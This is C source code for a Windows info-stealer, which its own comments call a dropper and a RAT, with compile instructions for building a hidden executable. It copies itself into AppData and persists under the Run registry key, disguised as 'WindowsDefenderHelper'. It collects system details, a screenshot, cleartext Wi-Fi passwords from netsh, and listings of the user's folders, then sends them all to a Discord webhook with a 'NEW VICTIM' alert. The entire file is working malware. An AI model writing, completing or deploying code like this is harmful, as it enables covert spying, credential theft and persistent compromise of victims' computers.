/*
 * camzzz Dropper — C version
 * Compiles to a tiny standalone .exe (~50-80KB), zero dependencies
 *
 * Windows compile:
 *   gcc dropper.c -o dropper.exe -lwinhttp -lws2_32 -lgdi32 -lole32 -luuid -mwindows -O2
 *   (mwindows = no console window)
 *
 * Cross-compile from Linux:
 *   x86_64-w64-mingw32-gcc dropper.c -o dropper.exe -lwinhttp -lws2_32 -lgdi32 -lole32 -luuid -mwindows -O2
 *
 * Collects:
 *   - System info (hostname, user, OS, IP)
 *   - Screenshot (GDI)
 *   - Wifi passwords
 *   - Browser history paths
 *   - Full file listing (Desktop/Downloads/Documents)
 *   - All sent to Discord webhook as files
 *   - Persists via HKCU Run registry key
 *   - Runs completely hidden (no window, no taskbar)
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <winsock2.h>
#include <shlobj.h>
#include <gdiplus.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "ole32.lib")

// ── CONFIG — change before compiling ─────────────────────────────────────────
// Get your webhook URL from: Discord > Server > Settings > Integrations > Webhooks
#define WEBHOOK_HOST  L"discord.com"
#define WEBHOOK_PATH  L"/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
// ─────────────────────────────────────────────────────────────────────────────

#define LOOT_DIR    "C:\\ProgramData\\WinSvc"
#define MAX_BUF     8192

// ── helpers ───────────────────────────────────────────────────────────────────

void make_dir(const char *path) {
    CreateDirectoryA(path, NULL);
}

void write_file(const char *path, const char *data, DWORD len) {
    HANDLE h = CreateFileA(path, GENERIC_WRITE, 0, NULL,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    DWORD written;
    WriteFile(h, data, len, &written, NULL);
    CloseHandle(h);
}

void append_file(const char *path, const char *data) {
    HANDLE h = CreateFileA(path, FILE_APPEND_DATA, 0, NULL,
                           OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    DWORD written;
    SetFilePointer(h, 0, NULL, FILE_END);
    WriteFile(h, data, (DWORD)strlen(data), &written, NULL);
    CloseHandle(h);
}

// Run a command and capture output into buffer
DWORD run_cmd(const char *cmd, char *out, DWORD out_size) {
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    HANDLE r_pipe, w_pipe;
    if (!CreatePipe(&r_pipe, &w_pipe, &sa, 0)) return 0;
    SetHandleInformation(r_pipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = {0};
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput  = w_pipe;
    si.hStdError   = w_pipe;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {0};
    char full_cmd[512];
    snprintf(full_cmd, sizeof(full_cmd), "cmd.exe /C %s", cmd);

    if (!CreateProcessA(NULL, full_cmd, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(r_pipe); CloseHandle(w_pipe);
        return 0;
    }
    CloseHandle(w_pipe);
    WaitForSingleObject(pi.hProcess, 15000);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);

    DWORD total = 0, bytes_read;
    while (total < out_size - 1 &&
           ReadFile(r_pipe, out + total, out_size - total - 1, &bytes_read, NULL) &&
           bytes_read > 0) {
        total += bytes_read;
    }
    out[total] = 0;
    CloseHandle(r_pipe);
    return total;
}

// ── sysinfo ───────────────────────────────────────────────────────────────────

void collect_sysinfo(const char *folder) {
    char path[MAX_PATH];
    snprintf(path, sizeof(path), "%s\\sysinfo.txt", folder);

    char buf[MAX_BUF] = {0};
    char tmp[1024]    = {0};

    // Hostname
    char hostname[256] = {0};
    DWORD hlen = sizeof(hostname);
    GetComputerNameA(hostname, &hlen);

    // Username
    char username[256] = {0};
    DWORD ulen = sizeof(username);
    GetUserNameA(username, &ulen);

    // Windows version
    OSVERSIONINFOEXA osvi = {0};
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    GetVersionExA((LPOSVERSIONINFOA)&osvi);

    // Local IP
    char local_ip[64] = "?";
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);
    struct hostent *he = gethostbyname(hostname);
    if (he && he->h_addr_list[0])
        snprintf(local_ip, sizeof(local_ip), "%s",
                 inet_ntoa(*(struct in_addr*)he->h_addr_list[0]));

    // Is admin?
    BOOL is_admin = FALSE;
    SID_IDENTIFIER_AUTHORITY auth = SECURITY_NT_AUTHORITY;
    PSID admin_grp;
    if (AllocateAndInitializeSid(&auth, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                 DOMAIN_ALIAS_RID_ADMINS, 0,0,0,0,0,0, &admin_grp)) {
        CheckTokenMembership(NULL, admin_grp, &is_admin);
        FreeSid(admin_grp);
    }

    // System drive free space
    ULARGE_INTEGER free_bytes, total_bytes;
    GetDiskFreeSpaceExA("C:\\", &free_bytes, &total_bytes, NULL);

    // RAM
    MEMORYSTATUSEX mem = {0};
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);

    // Time
    SYSTEMTIME st;
    GetLocalTime(&st);
    char time_str[64];
    snprintf(time_str, sizeof(time_str), "%04d-%02d-%02d %02d:%02d:%02d",
             st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);

    snprintf(buf, sizeof(buf),
        "============================================\n"
        "  camzzz RAT — VICTIM SYSTEM INFO\n"
        "============================================\n"
        "Hostname    : %s\n"
        "Username    : %s\n"
        "Admin       : %s\n"
        "OS          : Windows %d.%d (Build %d)\n"
        "Local IP    : %s\n"
        "RAM         : %llu MB total / %llu MB free\n"
        "Disk C:     : %llu GB total / %llu GB free\n"
        "Time        : %s\n"
        "============================================\n",
        hostname, username,
        is_admin ? "YES ★" : "No",
        osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber,
        local_ip,
        mem.ullTotalPhys / 1024 / 1024,
        mem.ullAvailPhys  / 1024 / 1024,
        total_bytes.QuadPart / 1024 / 1024 / 1024,
        free_bytes.QuadPart  / 1024 / 1024 / 1024,
        time_str
    );

    write_file(path, buf, (DWORD)strlen(buf));
}

// ── screenshot ────────────────────────────────────────────────────────────────

void collect_screenshot(const char *folder) {
    char path[MAX_PATH];
    snprintf(path, sizeof(path), "%s\\screenshot.bmp", folder);

    int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y = GetSystemMetrics(SM_YVIRTUALSCREEN);

    HDC screen_dc = GetDC(NULL);
    HDC mem_dc    = CreateCompatibleDC(screen_dc);
    HBITMAP bmp   = CreateCompatibleBitmap(screen_dc, w, h);
    HGDIOBJ old   = SelectObject(mem_dc, bmp);

    BitBlt(mem_dc, 0, 0, w, h, screen_dc, x, y, SRCCOPY | CAPTUREBLT);

    // Save as BMP
    BITMAPINFOHEADER bih = {0};
    bih.biSize        = sizeof(bih);
    bih.biWidth       = w;
    bih.biHeight      = -h;
    bih.biPlanes      = 1;
    bih.biBitCount    = 24;
    bih.biCompression = BI_RGB;

    DWORD row_size  = ((w * 3 + 3) & ~3);
    DWORD img_size  = row_size * h;
    BYTE *pixels    = (BYTE*)malloc(img_size);
    if (!pixels) goto cleanup;

    GetDIBits(mem_dc, bmp, 0, h, pixels, (BITMAPINFO*)&bih, DIB_RGB_COLORS);

    BITMAPFILEHEADER bfh = {0};
    bfh.bfType      = 0x4D42;
    bfh.bfOffBits   = sizeof(bfh) + sizeof(bih);
    bfh.bfSize      = bfh.bfOffBits + img_size;

    HANDLE f = CreateFileA(path, GENERIC_WRITE, 0, NULL,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(f, &bfh, sizeof(bfh), &written, NULL);
        WriteFile(f, &bih, sizeof(bih), &written, NULL);
        WriteFile(f, pixels, img_size, &written, NULL);
        CloseHandle(f);
    }
    free(pixels);

cleanup:
    SelectObject(mem_dc, old);
    DeleteObject(bmp);
    DeleteDC(mem_dc);
    ReleaseDC(NULL, screen_dc);
}

// ── wifi passwords ────────────────────────────────────────────────────────────

void collect_wifi(const char *folder) {
    char path[MAX_PATH];
    snprintf(path, sizeof(path), "%s\\wifi.txt", folder);

    char buf[MAX_BUF] = {0};
    char profiles[MAX_BUF] = {0};

    // Get all wifi profile names
    run_cmd("netsh wlan show profiles", profiles, sizeof(profiles));

    append_file(path, "=== WIFI PASSWORDS ===\n\n");

    // Parse profile names and get passwords
    char *line = strtok(profiles, "\n");
    while (line) {
        char *colon = strrchr(line, ':');
        if (colon && (strstr(line, "All User Profile") ||
                      strstr(line, "Profil utilisateur"))) {
            // Trim the profile name
            char *name = colon + 1;
            while (*name == ' ') name++;
            char *end = name + strlen(name) - 1;
            while (end > name && (*end == '\r' || *end == '\n' || *end == ' '))
                *end-- = 0;

            if (strlen(name) > 0) {
                char cmd[512], pw_out[MAX_BUF] = {0};
                snprintf(cmd, sizeof(cmd),
                    "netsh wlan show profile name=\"%s\" key=clear", name);
                run_cmd(cmd, pw_out, sizeof(pw_out));

                char entry[512];
                char *pw_line = strstr(pw_out, "Key Content");
                if (!pw_line) pw_line = strstr(pw_out, "Contenu de la cl");
                char password[256] = "[open/no password]";
                if (pw_line) {
                    char *pw_colon = strchr(pw_line, ':');
                    if (pw_colon) {
                        pw_colon++;
                        while (*pw_colon == ' ') pw_colon++;
                        char *pw_end = pw_colon + strlen(pw_colon) - 1;
                        while (pw_end > pw_colon &&
                               (*pw_end == '\r' || *pw_end == '\n' || *pw_end == ' '))
                            *pw_end-- = 0;
                        strncpy(password, pw_colon, sizeof(password)-1);
                    }
                }
                snprintf(entry, sizeof(entry), "%-30s : %s\n", name, password);
                append_file(path, entry);
            }
        }
        line = strtok(NULL, "\n");
    }
}

// ── file listing ──────────────────────────────────────────────────────────────

void list_dir(const char *folder, const char *out_file, const char *label) {
    char line[MAX_PATH + 64];
    snprintf(line, sizeof(line), "\n=== %s ===\n", label);
    append_file(out_file, line);

    WIN32_FIND_DATAA fd;
    char pattern[MAX_PATH];
    snprintf(pattern, sizeof(pattern), "%s\\*", folder);

    HANDLE h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) {
        append_file(out_file, "  [empty or not found]\n");
        return;
    }
    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;
        BOOL is_dir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
        ULARGE_INTEGER sz;
        sz.LowPart  = fd.nFileSizeLow;
        sz.HighPart = fd.nFileSizeHigh;
        snprintf(line, sizeof(line), "  %s  %s%s\n",
                 is_dir ? "[D]" : "[F]",
                 fd.cFileName,
                 is_dir ? "" : "");
        append_file(out_file, line);
    } while (FindNextFileA(h, &fd));
    FindClose(h);
}

void collect_files(const char *folder) {
    char out_path[MAX_PATH];
    snprintf(out_path, sizeof(out_path), "%s\\files.txt", folder);
    write_file(out_path, "=== FILE LISTING ===\n", 21);

    char home[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, home);

    char desktop[MAX_PATH], downloads[MAX_PATH],
         documents[MAX_PATH], pictures[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktop);
    SHGetFolderPathA(NULL, CSIDL_MYDOCUMENTS,      NULL, 0, documents);
    SHGetFolderPathA(NULL, CSIDL_MYPICTURES,       NULL, 0, pictures);
    snprintf(downloads, MAX_PATH, "%s\\Downloads", home);

    list_dir(desktop,   out_path, "Desktop");
    list_dir(downloads, out_path, "Downloads");
    list_dir(documents, out_path, "Documents");
    list_dir(pictures,  out_path, "Pictures");
}

// ── persistence ───────────────────────────────────────────────────────────────

void persist(void) {
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);

    HKEY key;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &key) == ERROR_SUCCESS) {
        RegSetValueExA(key, "WindowsDefenderHelper", 0, REG_SZ,
                       (BYTE*)exe_path, (DWORD)strlen(exe_path)+1);
        RegCloseKey(key);
    }
}

// ── copy exe to stable location ───────────────────────────────────────────────

void move_to_appdata(void) {
    char src[MAX_PATH], dst[MAX_PATH];
    GetModuleFileNameA(NULL, src, MAX_PATH);
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, dst);
    strncat(dst, "\\WinSvcHost.exe", MAX_PATH - strlen(dst) - 1);
    if (_stricmp(src, dst) != 0) {
        CopyFileA(src, dst, FALSE);
        // Launch the copy and exit current instance
        ShellExecuteA(NULL, "open", dst, NULL, NULL, SW_HIDE);
        ExitProcess(0);
    }
}

// ── Discord webhook sender (multipart/form-data) ──────────────────────────────

void send_to_discord(const char *file_path, const char *message) {
    if (!file_path && !message) return;

    // Read file
    BYTE *file_data = NULL;
    DWORD file_size = 0;
    const char *fname = "file.txt";

    if (file_path) {
        HANDLE hf = CreateFileA(file_path, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
        if (hf != INVALID_HANDLE_VALUE) {
            file_size = GetFileSize(hf, NULL);
            file_data = (BYTE*)malloc(file_size);
            DWORD read;
            ReadFile(hf, file_data, file_size, &read, NULL);
            CloseHandle(hf);
            // Extract filename from path
            const char *slash = strrchr(file_path, '\\');
            if (!slash) slash = strrchr(file_path, '/');
            fname = slash ? slash + 1 : file_path;
        }
    }

    // Build multipart body
    char boundary[] = "----RatBoundary7x3k9z";
    char *body = (char*)malloc(file_size + 4096);
    DWORD body_len = 0;

    char part_header[1024];
    int ph_len;

    if (message) {
        ph_len = snprintf(part_header, sizeof(part_header),
            "--%s\r\n"
            "Content-Disposition: form-data; name=\"content\"\r\n\r\n"
            "%s\r\n",
            boundary, message);
        memcpy(body + body_len, part_header, ph_len);
        body_len += ph_len;
    }

    if (file_data && file_size > 0) {
        ph_len = snprintf(part_header, sizeof(part_header),
            "--%s\r\n"
            "Content-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
            "Content-Type: application/octet-stream\r\n\r\n",
            boundary, fname);
        memcpy(body + body_len, part_header, ph_len);
        body_len += ph_len;
        memcpy(body + body_len, file_data, file_size);
        body_len += file_size;
        memcpy(body + body_len, "\r\n", 2);
        body_len += 2;
    }

    char final_boundary[128];
    int fb_len = snprintf(final_boundary, sizeof(final_boundary),
                          "--%s--\r\n", boundary);
    memcpy(body + body_len, final_boundary, fb_len);
    body_len += fb_len;

    // WinHTTP request
    HINTERNET session = WinHttpOpen(L"Mozilla/5.0",
                                    WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                    WINHTTP_NO_PROXY_NAME,
                                    WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) goto cleanup;

    HINTERNET connect = WinHttpConnect(session, WEBHOOK_HOST,
                                       INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!connect) { WinHttpCloseHandle(session); goto cleanup; }

    HINTERNET request = WinHttpOpenRequest(connect, L"POST", WEBHOOK_PATH,
                                           NULL, WINHTTP_NO_REFERER,
                                           WINHTTP_DEFAULT_ACCEPT_TYPES,
                                           WINHTTP_FLAG_SECURE);
    if (!request) { WinHttpCloseHandle(connect); WinHttpCloseHandle(session); goto cleanup; }

    // Content-Type header with boundary
    wchar_t ct_header[256];
    swprintf(ct_header, 256,
             L"Content-Type: multipart/form-data; boundary=%hs", boundary);
    WinHttpAddRequestHeaders(request, ct_header, (DWORD)-1L,
                             WINHTTP_ADDREQ_FLAG_ADD);

    WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                       body, body_len, body_len, 0);
    WinHttpReceiveResponse(request, NULL);

    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);

cleanup:
    if (file_data) free(file_data);
    if (body)      free(body);
}

// ── main ─────────────────────────────────────────────────────────────────────

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev,
                   LPSTR lpCmd, int nShow) {
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    // Move to stable location and persist
    move_to_appdata();
    persist();

    // Create loot folder
    make_dir(LOOT_DIR);

    // Small delay so system settles
    Sleep(2000);

    // Collect everything
    collect_sysinfo(LOOT_DIR);
    collect_screenshot(LOOT_DIR);
    collect_wifi(LOOT_DIR);
    collect_files(LOOT_DIR);

    // Send to Discord
    char hostname[256] = {0};
    DWORD hlen = sizeof(hostname);
    GetComputerNameA(hostname, &hlen);

    char msg[512];
    snprintf(msg, sizeof(msg), "**NEW VICTIM** — `%s`", hostname);

    send_to_discord(NULL,                   msg);
    Sleep(500);
    send_to_discord(LOOT_DIR "\\sysinfo.txt",    "**System Info**");
    Sleep(500);
    send_to_discord(LOOT_DIR "\\wifi.txt",       "**Wifi Passwords**");
    Sleep(500);
    send_to_discord(LOOT_DIR "\\files.txt",      "**File Listing**");
    Sleep(500);
    send_to_discord(LOOT_DIR "\\screenshot.bmp", "**Screenshot**");

    return 0;
}
